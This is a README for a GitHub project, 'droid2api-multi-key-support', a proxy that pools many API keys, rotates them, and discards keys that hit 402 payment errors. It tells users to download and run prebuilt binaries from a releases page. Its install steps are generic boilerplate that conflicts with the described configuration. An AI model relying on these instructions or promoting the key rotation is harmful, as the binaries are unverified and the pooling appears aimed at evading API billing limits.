# 🎉 droid2api-multi-key-support - Effortless API Key Management

[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/wannurvaren/droid2api-multi-key-support/releases)

## 🚀 Getting Started

Welcome to the droid2api-multi-key-support project! This software acts as a convenient proxy server for OpenAI-compatible APIs, enabling seamless access to various large language models (LLMs). 

In this guide, you will find everything you need to successfully download and run the software.

## 📥 Download & Install

To get the software, visit the following link to access the Releases page:

[Visit the Release Page](https://github.com/wannurvaren/droid2api-multi-key-support/releases)

Once there, look for the latest version and choose the appropriate file for your operating system. If you are not sure which file to download, check the following suggestions based on common operating systems:

- **Windows Users:** Download the `.exe` file.
- **Mac Users:** Download the `.dmg` file.
- **Linux Users:** Download the `.tar.gz` or `.sh` file.

After downloading, follow these steps to install:

1. **Locate the downloaded file.**
2. **Run the file:**
   - For Windows, double-click the `.exe` file.
   - For Mac, open the `.dmg` file and drag the application to your Applications folder.
   - For Linux, you may need to make the `.sh` file executable by running `chmod +x filename.sh` in the terminal.

3. **Follow any prompts to complete the installation.**

## 🔑 Key Features

The droid2api-multi-key-support provides several important features:

### **Multi-API Key Support**

- **Key Pooling:** Add multiple API keys to your setup.
- **Semicolon Separation:** Separate keys in the environment variable with a semicolon `;`.
- **File Configuration:** Store keys in a `factory_keys.txt` file, with one key per line.
- **Polling Methods:** Choose between weighted polling based on health or simple sequential polling.
- **Smart Selection:** The system automatically selects keys based on historical success rates.

### **Automatic Key Management**

- **402 Response Handling:** Keys that get a 402 response are automatically discarded.
- **Smart Protection:** Discarded keys won't participate in polling, preventing continuous failures.
- **Configurable Removal:** Adjust the configuration to control this behavior.
- **Fault Isolation:** Automatically isolates any key that fails, preserving system stability.

### **Monitoring and Statistics**

- **Status Interface:** Access key and endpoint statistics through the `/status` endpoint.
- **Success Rate Tracking:** Monitor the success and failure counts for each key.
- **Secure Key Display:** Only the first six and last six characters of keys are shown to maintain privacy.
- **Endpoint Statistics:** Keep track of request success rates for each endpoint.
- **Discarded Keys List:** View a list of keys that were discarded and their respective discard times.
- **Auto-Refresh:** The interface supports refresh intervals from 5 seconds to 10 minutes.

### **Authorization Controls**

- **Multiple Authorization Options:** Set up multiple API keys for automatic selection.
- **Key Priority:** Use environment variables or files to prioritize API key usage.
- **Token Auto-Refresh:** Integrated with WorkOS OAuth, allowing automatic token refresh every 6 hours.
- **Fallback Authorization:** In cases with no configuration, the client request header's authorization field will be used.
- **Smart Priority Order:** Follows a specific order for the authorization process.
- **Fault-Tolerant Startup:** The software will run even without any authentication configurations.

### **Intelligent Inference Level Control**

- **Five Levels of Inference:** Control the inference levels to suit your needs.

## 📋 System Requirements

- **Operating System:** Windows 10 or later, macOS 10.14 or later, Linux (various distributions).
- **RAM:** A minimum of 4 GB is recommended.
- **Disk Space:** At least 100 MB of free space.
- **Network:** A stable internet connection is essential for API access.

## ⚙️ Configuration

After installation, you will need to configure your application with the necessary API keys. Here’s how to do that:

1. **Open the configuration file:** Locate `config.json` in the installation directory.
2. **Edit the file:** Add your API keys in the designated section. Use the format as detailed:
   ```json
   {
     "FACTORY_API_KEY": "your_key_1;your_key_2"
   }
   ```
3. Save the changes and close the file.

## 🔄 Running the Application

Once your configuration is complete, you can start using the application. 

### On Windows:

1. Open the Command Prompt.
2. Navigate to the installation directory.
3. Run the application with the following command:
   ```
   droid2api.exe
   ```

### On Mac:

1. Open the Terminal.
2. Navigate to the installation directory.
3. Run the application with:
   ```
   ./droid2api
   ```

### On Linux:

1. Open the Terminal.
2. Navigate to the installation directory.
3. Run the application with:
   ```
   ./droid2api
   ```

## 📞 Support

If you encounter any issues or have questions, check our [FAQs](https://github.com/wannurvaren/droid2api-multi-key-support/wiki) or submit an issue on the GitHub repository.

Thank you for choosing droid2api-multi-key-support. Happy coding!